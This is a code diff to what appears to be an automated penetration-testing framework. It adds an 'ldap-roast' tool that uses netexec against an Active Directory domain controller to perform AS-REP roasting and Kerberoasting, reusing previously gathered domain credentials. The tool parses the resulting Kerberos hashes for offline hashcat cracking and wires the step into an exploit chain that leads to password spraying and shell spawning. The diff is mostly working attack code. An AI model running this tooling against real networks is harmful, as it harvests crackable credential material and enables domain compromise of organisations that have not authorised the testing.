@@ -2337,6 +2337,20 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
         return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL" if admin else "HIGH",
                 "summary": f"MSSQL creds: {shown}"[:140]}
 
+    # 2bv) ldap-roast: AS-REP / Kerberoast hashes → offline crack to domain creds
+    if sid == "ldap-roast":
+        asrep = re.findall(r"^✗ ASREP (\S+)", output, re.M)
+        tgs = re.findall(r"^✗ TGS (\S+)", output, re.M)
+        if not asrep and not tgs:
+            return None
+        bits = []
+        if asrep:
+            bits.append(f"AS-REP: {', '.join(asrep[:3])}")
+        if tgs:
+            bits.append(f"Kerberoast: {', '.join(tgs[:3])}")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"roastable ({'; '.join(bits)})"[:140]}
+
     # 2bu) ldap-enum: anonymous AD enumeration (exposed) → else domain/user info
     if sid == "ldap-enum":
         if re.search(r"^✗ ANON ", output, re.M):
@@ -3520,7 +3534,7 @@ _EXPLOIT_STEPS = {
         ("Bind (anon / reused cred) → domain, users, AS-REP flags, password policy", "ldap-enum"),
         "Map attack paths with BloodHound (LDAP collector) — ACLs, sessions, GPOs, delegation",
         # ── roast targets ──
-        "Flag AS-REP (DONT_REQ_PREAUTH) and Kerberoast (servicePrincipalName) targets",
+        ("AS-REP roast (no creds) + Kerberoast (any cred) → crackable hashes", "ldap-roast"),
         # ── loot secrets from LDAP ──
         "Read LAPS (ms-Mcs-AdmPwd) and gMSA passwords (ReadGMSAPassword) where allowed",
         # ── ACL & object abuse (write rights) ──
@@ -14204,6 +14218,59 @@ def _tool_ldap_enum(ip: str, port: int, proto: str) -> str:
     return f"LDAP enum — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── LDAP step 2: AS-REP roast (no creds) + Kerberoast (any domain cred) → hashes ─
+def _tool_ldap_roast(ip: str, port: int, proto: str) -> str:
+    """LDAP step 2 tool: harvest crackable Kerberos hashes — AS-REP roast accounts with pre-auth
+    disabled (works with just a user list / anonymous LDAP) and Kerberoast servicePrincipalName
+    accounts (needs any valid domain cred). netexec ldap --asreproast / --kerberoasting; the hashes
+    are parsed for offline cracking (hashcat -m 18200 / -m 13100). No netexec → raises. Authorised
+    targets only."""
+    import tempfile
+    if not (shutil.which("netexec") or shutil.which("nxc")):
+        raise RuntimeError("netexec (nxc) required for AS-REP / Kerberoast")
+
+    domcreds = [(d, u, s) for d, u, s in _gather_all_smb_creds() if s]
+    user, secret, anon = (domcreds[0][1], domcreds[0][2], False) if domcreds else ("", "", True)
+
+    def _roast(flag):
+        fd, path = tempfile.mkstemp(prefix="pshunter_roast_")
+        os.close(fd)
+        rc, out = _ldap_run(ip, port, user, secret, [flag, path], timeout=150)
+        extra = ""
+        try:
+            with open(path, errors="ignore") as fh:
+                extra = fh.read()
+        except OSError:
+            pass
+        _safe_unlink(path)
+        return rc, (out or "") + "\n" + extra
+
+    rc, aout = _roast("--asreproast")
+    if rc is None:
+        raise RuntimeError(f"{ip}:{port} — netexec ldap did not run (down / not a DC?)")
+    asrep = list(dict.fromkeys(re.findall(r"\$krb5asrep\$[^\s'\"]+", aout)))
+
+    kerb = []
+    if not anon:                                             # Kerberoast needs an authenticated bind
+        _rc, kout = _roast("--kerberoasting")
+        kerb = list(dict.fromkeys(re.findall(r"\$krb5tgs\$[^\s'\"]+", kout)))
+
+    lines = [f"[*] bind: {'anonymous' if anon else user} · AS-REP {len(asrep)} · Kerberoast {len(kerb)}"]
+    for h in asrep[:20]:
+        who = re.search(r"\$krb5asrep\$\d+\$([^:@*]+)", h)
+        lines.append(f"✗ ASREP {who.group(1) if who else '?'}  {h[:48]}…  (hashcat -m 18200)")
+    for h in kerb[:20]:
+        who = re.search(r"\$krb5tgs\$\d+\$\*?([^$*]+)", h)
+        lines.append(f"✗ TGS {who.group(1) if who else '?'}  {h[:48]}…  (hashcat -m 13100)")
+    if asrep or kerb:
+        lines.append("· crack offline → domain creds; then re-run ldap-enum/loot & spray (mind lockout)")
+    elif anon:
+        lines.append("· nothing AS-REP-roastable anonymously — need a domain cred for Kerberoast (SMB phase)")
+    else:
+        lines.append("· no roastable accounts for this cred")
+    return f"LDAP roast — {ip}:{port}\n\n" + "\n".join(lines)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -14369,6 +14436,7 @@ _STEP_TOOLS = {
     "ssh-shell": ("SSH foothold → direct interactive session (spawned)", _tool_ssh_shell),
     "ssh-next": ("manual SSH steps (context-aware, reference only)", _tool_ssh_next),
     "ldap-enum": ("AD enum via netexec ldap — domain, users, AS-REP flags, password policy", _tool_ldap_enum),
+    "ldap-roast": ("AS-REP roast + Kerberoast → crackable hashes (netexec ldap)", _tool_ldap_roast),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -14468,6 +14536,7 @@ _STEP_TOOL_RUNS = {
     "ssh-shell":        ("ssh / sshpass", None),
     "ssh-next":         ("reference · no scan", None),
     "ldap-enum":        ("netexec ldap", f"{_mins(_LDAPENUM_DEADLINE)} min"),
+    "ldap-roast":       ("netexec ldap", None),
     "spawn-shell":      ("router → service foothold", None),
 }
 
